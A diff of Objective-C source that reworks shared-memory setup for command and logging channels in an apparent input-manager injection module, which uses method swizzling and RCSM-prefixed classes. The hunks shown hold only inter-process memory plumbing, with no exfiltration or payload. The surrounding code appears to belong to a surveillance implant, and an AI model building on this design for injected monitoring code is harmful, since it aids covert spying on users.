@@ -343,6 +343,12 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
           return;
         }
+      else
+        {
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Attached to shared memory");
+#endif
+        }
       
       if (gOSMajor == 10 && gOSMinor == 6)
         {
@@ -376,6 +382,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
   key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
   
+  gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
+
   mSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
                                                           size: gMemCommandMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
@@ -387,35 +395,25 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       [mSharedMemoryCommand release];
       return NO;
     }
-  [mSharedMemoryCommand attachToMemoryRegion];
-  
+
   mSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
+
   if ([mSharedMemoryLogging createMemoryRegion] == -1)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      warnLog(@"Error while creating shared memory for logging, trying with lower size");
+      errorLog(@"Error while creating shared memory for logging");
 #endif
-
+      [mSharedMemoryCommand release];
       [mSharedMemoryLogging release];
-      gMemLogMaxSize = 0x7a440;
-
-      mSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                              size: gMemLogMaxSize
-                                                     semaphoreName: SHMEM_SEM_NAME];
-
-      if ([mSharedMemoryLogging createMemoryRegion] == -1)
-        {
-#ifdef DEBUG_INPUT_MANAGER
-          errorLog(@"Error on shared memory for logging, quitting");
-#endif
-          [mSharedMemoryCommand release];
-          [mSharedMemoryLogging release];
-          return NO;
-        }
+      return NO;
     }
 
+  //
+  // Now it's safe to attach
+  //
+  [mSharedMemoryCommand attachToMemoryRegion];
   [mSharedMemoryLogging attachToMemoryRegion];
 
   return YES;
